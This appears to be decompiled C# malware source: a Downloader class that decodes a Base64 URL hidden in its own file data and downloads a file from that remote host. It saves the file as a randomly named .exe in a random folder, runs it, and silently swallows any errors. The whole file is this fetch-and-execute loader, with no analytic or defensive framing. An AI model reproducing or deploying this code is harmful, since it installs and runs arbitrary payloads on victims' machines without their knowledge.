using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

// Token: 0x02000024 RID: 36
internal class Downloader
{
	// Token: 0x0600005B RID: 91 RVA: 0x00005CCC File Offset: 0x00003ECC
	public static void Load()
	{
		try
		{
			using (WebClient webClient = new WebClient())
			{
				string text = Exporter.Export("<ulfile>", "</ulfile>", Starter.FileData);
				if (!string.IsNullOrEmpty(text))
				{
					string text2 = string.Format("{0}\\{1}.exe", CreateDir.create(GetRandom.String(null, 8), null, null), GetRandom.String(null, 8));
					if (File.Exists(text2))
					{
						File.Delete(text2);
					}
					File.WriteAllText(text2, webClient.DownloadString(Base64.Decode(text, null)), Encoding.GetEncoding(1251));
					Process.Start(text2);
				}
			}
		}
		catch
		{
		}
	}
}
